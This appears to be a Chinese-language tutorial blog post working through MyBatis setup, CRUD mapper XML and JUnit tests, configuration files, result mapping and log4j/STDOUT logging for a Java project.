+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper</span><br><span class="line">        PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Mapper 3.0&#x2F;&#x2F;EN&quot;</span><br><span class="line">        &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;</span><br><span class="line">&lt;!--namespace&#x3D;绑定一个对应的Dao&#x2F;Mapper接口--&gt;</span><br><span class="line">&lt;mapper namespace&#x3D;&quot;com.kuang.dao.UserDao&quot;&gt;</span><br><span class="line">    &lt;select id&#x3D;&quot;selectUser&quot; resultType&#x3D;&quot;com.kuang.pojo.User&quot;&gt;</span><br><span class="line">        select * from user</span><br><span class="line">    &lt;&#x2F;select&gt;</span><br><span class="line">&lt;&#x2F;mapper&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>2.4 测试<br>junit测试</p>
+<p>Maven问题：target不生成xml文件（配置文件无法被导出的问题）<br>解决方法：手动配置资源过滤<br>maven的配置里（pom.xml）加下面代码：(保险起见，子项目也放一份)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">        &lt;resources&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt;</span><br><span class="line">                &lt;includes&gt;</span><br><span class="line">                    &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt;</span><br><span class="line">                    &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt;</span><br><span class="line">                &lt;&#x2F;includes&gt;</span><br><span class="line">                &lt;filtering&gt;true&lt;&#x2F;filtering&gt;</span><br><span class="line">            &lt;&#x2F;resource&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;src&#x2F;main&#x2F;java&lt;&#x2F;directory&gt;</span><br><span class="line">                &lt;includes&gt;</span><br><span class="line">                    &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt;</span><br><span class="line">                    &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt;</span><br><span class="line">                &lt;&#x2F;includes&gt;</span><br><span class="line">                &lt;filtering&gt;true&lt;&#x2F;filtering&gt;</span><br><span class="line">            &lt;&#x2F;resource&gt;</span><br><span class="line">        &lt;&#x2F;resources&gt;</span><br><span class="line">    &lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure>
+
+<p>UserDaoTest.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.dao;</span><br><span class="line"></span><br><span class="line">import com.kuang.pojo.User;</span><br><span class="line">import com.kuang.utils.MybatisUtils;</span><br><span class="line">import org.apache.ibatis.session.SqlSession;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class UserDaoTest &#123;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void test()&#123;</span><br><span class="line">        &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">        SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">        &#x2F;&#x2F;方式一：执行SQL</span><br><span class="line">        UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userList &#x3D; userDao.selectUser();</span><br><span class="line"></span><br><span class="line">        for(User user:userList)&#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>3.增删改查<br>namespace：包名要和接口一致<br>查询语句：<br>    id：namespace中的方法名<br>    resultType：Sql语句执行的返回值<br>    parameterType：参数类型</p>
+<p>根据id查询用户:<br>UserDao:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;根据id查询用户</span><br><span class="line">User getUserById(int id);</span><br></pre></td></tr></table></figure>
+<p>UserMapper.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id&#x3D;&quot;getUserById&quot; parameterType&#x3D;&quot;int&quot; resultType&#x3D;&quot;com.kuang.pojo.User&quot;&gt;</span><br><span class="line">    select * from user where id &#x3D; #&#123;id&#125;</span><br><span class="line">&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>
+
+<p>UserDaoTest.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public  void getUserById()&#123;</span><br><span class="line">    &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">    SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">    UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line">    User user &#x3D; userDao.getUserById(1);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>insert一个用户:<br>UserDao:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;insert一个用户</span><br><span class="line">int addUser(User user);</span><br></pre></td></tr></table></figure>
+<p>UserMapper.xml(内容不要加注释！！！)（这里必须用对应的insert，不然会出问题，下同）<br>    <!--对象中的属性可以直接取出来--></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;insert id&#x3D;&quot;addUser&quot; parameterType&#x3D;&quot;com.kuang.pojo.User&quot;&gt;</span><br><span class="line">    insert into user (id,name,pwd) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;)</span><br><span class="line">&lt;&#x2F;insert&gt;</span><br></pre></td></tr></table></figure>
+
+<p>UserDaoTest.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;增删改需要提交事务!!</span><br><span class="line">@Test</span><br><span class="line">public  void addUser()&#123;</span><br><span class="line">    &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">    SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">    UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line">    int res &#x3D; userDao.addUser(new User(3,&quot;a&quot;,&quot;b&quot;));</span><br><span class="line">    if(res&gt;0)&#123;</span><br><span class="line">        System.out.println(&quot;插入成功&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;提交事务</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>修改用户:<br>UserDao:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;修改用户</span><br><span class="line">int updateUser(User user);</span><br></pre></td></tr></table></figure>
+<p>UserMapper.xml(内容不要加注释！！！)<br>    <!--对象中的属性可以直接取出来--></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;update id&#x3D;&quot;updateUser&quot; parameterType&#x3D;&quot;com.kuang.pojo.User&quot;&gt;</span><br><span class="line">    update mybatis.user set name&#x3D;#&#123;name&#125;,pwd&#x3D;#&#123;pwd&#125; where id&#x3D;#&#123;id&#125;;</span><br><span class="line">&lt;&#x2F;update&gt;</span><br></pre></td></tr></table></figure>
+
+<p>UserDaoTest.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;增删改需要提交事务!!</span><br><span class="line">@Test</span><br><span class="line">public  void updateUser()&#123;</span><br><span class="line">    &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">    SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">    UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line">    int res &#x3D; userDao.updateUser(new User(4,&quot;e&quot;,&quot;f&quot;));</span><br><span class="line">    if(res&gt;0)&#123;</span><br><span class="line">        System.out.println(&quot;修改成功&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;提交事务</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>删除用户:<br>UserDao:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;删除用户</span><br><span class="line">int deleteUser(int id);</span><br></pre></td></tr></table></figure>
+<p>UserMapper.xml(内容不要加注释！！！)<br>    <!--对象中的属性可以直接取出来--></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;delete id&#x3D;&quot;deleteUser&quot; parameterType&#x3D;&quot;int&quot;&gt;</span><br><span class="line">    delete from user where id &#x3D; #&#123;id&#125;;</span><br><span class="line">&lt;&#x2F;delete&gt;</span><br></pre></td></tr></table></figure>
+
+<p>UserDaoTest.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;增删改需要提交事务!!</span><br><span class="line">@Test</span><br><span class="line">public  void deleteUser()&#123;</span><br><span class="line">    &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">    SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">    UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line">    int res &#x3D; userDao.deleteUser(4);</span><br><span class="line">    if(res&gt;0)&#123;</span><br><span class="line">        System.out.println(&quot;删除成功&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;提交事务</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>读错从下往上读！！！</p>
+<p>7、万能的Map<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User addUser2(Map&lt;String,Object&gt; map);</span><br></pre></td></tr></table></figure><br>不用new出一个类（对象）<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;insert id&#x3D;&quot;addUser2&quot; parameterType&#x3D;&quot;map&quot;&gt;</span><br><span class="line">    insert into mybatis.user(id,name,pwd) values (#&#123;userid&#125;,#&#123;userName&#125;,#&#123;passWord&#125;);</span><br><span class="line">&lt;&#x2F;insert&gt;</span><br></pre></td></tr></table></figure></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public  void addUser2()&#123;</span><br><span class="line">    &#x2F;&#x2F;第一步：获得SqlSession对象</span><br><span class="line">    SqlSession sqlSession &#x3D; MybatisUtils.getSession();</span><br><span class="line">    UserDao userDao &#x3D; sqlSession.getMapper(UserDao.class);</span><br><span class="line">    Map&lt;String,Object&gt; map&#x3D; new HashMap&lt;String,Object&gt;();</span><br><span class="line">    map.put(&quot;userid&quot;,5);</span><br><span class="line">    map.put(&quot;userName&quot;,&quot;p&quot;);</span><br><span class="line">    map.put(&quot;passWord&quot;,&quot;q&quot;);</span><br><span class="line">    userDao.addUser2(map);</span><br><span class="line">    &#x2F;&#x2F;提交事务</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    &#x2F;&#x2F;关闭SqlSession</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 4、配置解析<br> 1.核心配置文件<br>    mybatis-config.xml<br>        environment：环境变量<br>        mappers：映射器<br>        properties：属性<br>        settings：设置<br>        typeAliases：类型别名</p>
+<p>environment：环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;environments default&#x3D;&quot;development&quot;&gt;</span><br><span class="line">        &lt;environment id&#x3D;&quot;development&quot;&gt;</span><br><span class="line">            &lt;transactionManager type&#x3D;&quot;JDBC&quot;&#x2F;&gt;</span><br><span class="line">            &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;mybatis?</span><br><span class="line">useSSL&#x3D;false&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;011125&quot;&#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;dataSource&gt;</span><br><span class="line">        &lt;&#x2F;environment&gt;</span><br><span class="line">    &lt;&#x2F;environments&gt;</span><br></pre></td></tr></table></figure>
+<p>写环境，新建<code>&lt;environment id=&quot;&quot;&gt;</code>,切换环境:<code>&lt;environments default=&quot;&quot;&gt;</code>改default的值</p>
+<figure class="highlight plain"><figcaption><span>type</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;&lt;dataSource type&#x3D;&quot;POOLED&quot;&gt;&#96;&#96;&#96;:数据源，用于连接数据库，可以填UNPOOLED|POOLED|JNDI</span><br><span class="line">UNPOOLED：无连接池</span><br><span class="line">POOLED：有连接池（可以让web相应更加流畅）（相当于内存？）</span><br><span class="line">JNDI：EJB使用的</span><br><span class="line"></span><br><span class="line">默认的事务管理器是JDBC，连接池POOLED</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;&lt;property name&#x3D;&quot;&quot; value&#x3D;&quot;&quot;&#x2F;&gt;&#96;&#96;&#96;配置文件</span><br><span class="line">如：&lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">properties：(引入外部配置文件)</span><br><span class="line">db.properties</span><br></pre></td></tr></table></figure>
+<p>driver=com.mysql.jdbc.Driver<br>url=jdbc:mysql://localhost:3306/mybatis?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf8<br>username=root<br>password=011125</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mybatis-config.xml</span><br></pre></td></tr></table></figure>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE configuration
+        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
+        "http://mybatis.org/dtd/mybatis-3-config.dtd">
+<configuration>
+    <properties resource="db.properties"/>
+    <environments default="development">
+        <environment id="development">
+            <transactionManager type="JDBC"/>
+            <dataSource type="POOLED">
+                <property name="driver" value="${driver}"/>
+                <property name="url" value="${url}"/>
+                <property name="username" value="${username}"/>
+                <property name="password" value="${password}"/>
+            </dataSource>
+        </environment>
+    </environments>
+    <mappers>
+        <mapper resource="com/kuang/dao/UserMapper.xml"/>
+    </mappers>
+</configuration>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也可以只写mybatis-config.xml：</span><br></pre></td></tr></table></figure>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE configuration
+        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
+        "http://mybatis.org/dtd/mybatis-3-config.dtd">
+<configuration>
+    <properties resource="db.properties">
+        <property name="driver" value="com.mysql.jdbc.Driver"/>
+        <property name="url" value="jdbc:mysql://localhost:3306/mybatis?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf8"/>
+        <property name="username" value="root"/>
+        <property name="password" value="011125"/>
+    </properties>
+    <environments default="development">
+        <environment id="development">
+            <transactionManager type="JDBC"/>
+            <dataSource type="POOLED">
+                <property name="driver" value="${driver}"/>
+                <property name="url" value="${url}"/>
+                <property name="username" value="${username}"/>
+                <property name="password" value="${password}"/>
+            </dataSource>
+        </environment>
+    </environments>
+    <mappers>
+        <mapper resource="com/kuang/dao/UserMapper.xml"/>
+    </mappers>
+</configuration>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">都存在时，优先级：db.properties更高</span><br><span class="line"></span><br><span class="line">2.别名(typeAliases)</span><br><span class="line">mybatis-config.xml:</span><br></pre></td></tr></table></figure>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE configuration
+        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
+        "http://mybatis.org/dtd/mybatis-3-config.dtd">
+<configuration>
+    <properties resource="db.properties"/>
+    <typeAliases>
+        <typeAlias type="com.kuang.pojo.User" alias="User"/>
+    </typeAliases>
+    <environments default="development">
+        <environment id="development">
+            <transactionManager type="JDBC"/>
+            <dataSource type="POOLED">
+                <property name="driver" value="${driver}"/>
+                <property name="url" value="${url}"/>
+                <property name="username" value="${username}"/>
+                <property name="password" value="${password}"/>
+            </dataSource>
+        </environment>
+    </environments>
+    <mappers>
+        <mapper resource="com/kuang/dao/UserMapper.xml"/>
+    </mappers>
+</configuration>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserMapper.xml(直接用User)</span><br></pre></td></tr></table></figure>
+    <select id="selectUser" resultType="User">
+        select * from user
+    </select>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">用途二：</span><br><span class="line">扫描实体类的包，它的默认别名就是这个类的类名，首字母小写</span><br><span class="line">例：直接用小写的user</span><br></pre></td></tr></table></figure>
+    <select id="selectUser" resultType="user">
+        select * from user
+    </select>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">在实体类比较少是，使用第一种</span><br><span class="line">如果实体类多，建议使用第二种</span><br><span class="line">第一种可以自定义别名，第二种不行（但是可以在实体类加一个注解来更改其别名，例&#96;&#96;&#96;@Alias(&quot;hello&quot;)&#96;&#96;&#96;）</span><br><span class="line"></span><br><span class="line">3.plugins插件</span><br><span class="line">    mybatis-generator-core</span><br><span class="line">    mybatis-plus</span><br><span class="line">    通用mapper</span><br><span class="line">    </span><br><span class="line">5、解决属性名和字段名不一致的问题</span><br><span class="line"></span><br><span class="line">假设数据库中的字段是id，name，pwd</span><br><span class="line">类中为id，name，password</span><br><span class="line"></span><br><span class="line">那么使用&#96;&#96;&#96;select * user where id&#x3D;#&#123;id&#125;&#96;&#96;&#96;时password的值会返回null</span><br><span class="line">解决方法：</span><br><span class="line">1.起别名：让sql查询出的结果改变&#96;&#96;&#96;select id,name,pwd as password user where id&#x3D;#&#123;id&#125;&#96;&#96;&#96;</span><br><span class="line">2.resultMap</span><br><span class="line">（结果集映射）</span><br></pre></td></tr></table></figure>
+    <resultMap id="UserMap" type="User">
+        <result column="id" property="id"/>
+        <result column="name" property="name"/>
+        <result column="pwd" property="password"/>
+    </resultMap>
+    <select id="getUserById" parameterType="int" resultMap="UserMap">
+        select * from user where id = #{id}
+    </select>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6、日志</span><br><span class="line">6.1 日志工厂</span><br><span class="line">如果一个数据库操作出现了异常，我们需要排错，日志是最好的助手</span><br><span class="line">曾经：sout，debug</span><br><span class="line">现在：日志工厂</span><br><span class="line">mybatis内置的日志：logImpl：SLF4J（酸辣粉四斤）、LOG4J（重点）、LOG4J2、JDK_LOGGING、COMMONS_LOGGING、STDOUT_LOGGING（重点）、NO_LOGGING</span><br><span class="line"></span><br><span class="line">（1）STDOUT_LOGGING：</span><br><span class="line">mybatis-config.xml直接加一句：</span><br></pre></td></tr></table></figure>
+    <settings>
+        <setting name="logImpl" value="STDOUT_LOGGING"/>
+    </settings>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">整体：</span><br></pre></td></tr></table></figure>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE configuration
+        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
+        "http://mybatis.org/dtd/mybatis-3-config.dtd">
+<configuration>
+    <properties resource="db.properties"/>
+    
+    <settings>
+        <setting name="logImpl" value="STDOUT_LOGGING"/>
+    </settings>
+    
+    <typeAliases>
+        <typeAlias type="com.kuang.pojo.User" alias="User"/>
+    </typeAliases>
+    <environments default="development">
+        <environment id="development">
+            <transactionManager type="JDBC"/>
+            <dataSource type="POOLED">
+                <property name="driver" value="${driver}"/>
+                <property name="url" value="${url}"/>
+                <property name="username" value="${username}"/>
+                <property name="password" value="${password}"/>
+            </dataSource>
+        </environment>
+    </environments>
+    <mappers>
+        <mapper resource="com/kuang/dao/UserMapper.xml"/>
+    </mappers>
+</configuration>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后再运行就会显示整个运行过程，非常方便：</span><br></pre></td></tr></table></figure>
+Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
+PooledDataSource forcefully closed/removed all connections.
+PooledDataSource forcefully closed/removed all connections.
+PooledDataSource forcefully closed/removed all connections.
+PooledDataSource forcefully closed/removed all connections.
+Opening JDBC Connection
+Created connection 441001942.
+Setting autocommit to false on JDBC Connection [com.mysql.jdbc.JDBC4Connection@1a4927d6]
+==>  Preparing: select * from user
+==> Parameters: 
+<==    Columns: id, name, pwd
+<==        Row: 1, a, b
+<==        Row: 2, c, d
+<==        Row: 3, a, b
+<==      Total: 3
+User{id=1, name='a', pwd='b'}
+User{id=2, name='c', pwd='d'}
+User{id=3, name='a', pwd='b'}
+Resetting autocommit to true on JDBC Connection [com.mysql.jdbc.JDBC4Connection@1a4927d6]
+Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@1a4927d6]
+Returned connection 441001942 to pool.
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（2）LOG4J:</span><br><span class="line">先导入包</span><br></pre></td></tr></table></figure>
+    <dependencies>
+        <!-- https://mvnrepository.com/artifact/log4j/log4j -->
+        <dependency>
+            <groupId>log4j</groupId>
+            <artifactId>log4j</artifactId>
+            <version>1.2.17</version>
+        </dependency>
+    </dependencies>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">创建log4j.properties，找一个合适的配置贴上去，如：</span><br></pre></td></tr></table></figure>
+#将等级为DEBUG的日志信息输出到console和file这两个目的地，console和file的定义在下面的代码
+log4j.rootLogger=DEBUG,console,file
+
+<p>#控制台输出的相关设置<br>log4j.appender.console = org.apache.log4j.ConsoleAppender<br>log4j.appender.console.Target = System.out<br>log4j.appender.console.Threshold=DEBUG<br>log4j.appender.console.layout = org.apache.log4j.PatternLayout<br>log4j.appender.console.layout.ConversionPattern=[%c]-%m%n</p>
+<p>#文件输出的相关设置<br>log4j.appender.file = org.apache.log4j.RollingFileAppender<br>log4j.appender.file.File=./log/kuang.log<br>log4j.appender.file.MaxFileSize=10mb<br>log4j.appender.file.Threshold=DEBUG<br>log4j.appender.file.layout=org.apache.log4j.PatternLayout<br>log4j.appender.file.layout.ConversionPattern=[%p][qinjiang%d{yy-MM-dd}][%c]%m%n</p>
+<p>#日志输出级别<br>log4j.logger.org.mybatis=DEBUG<br>log4j.logger.java.sql=DEBUG<br>log4j.logger.java.sql.Statement=DEBUG<br>log4j.logger.java.sql.ResultSet=DEBUG<br>log4j.logger.java.sql.PreparedStatement=DEBUG</p>
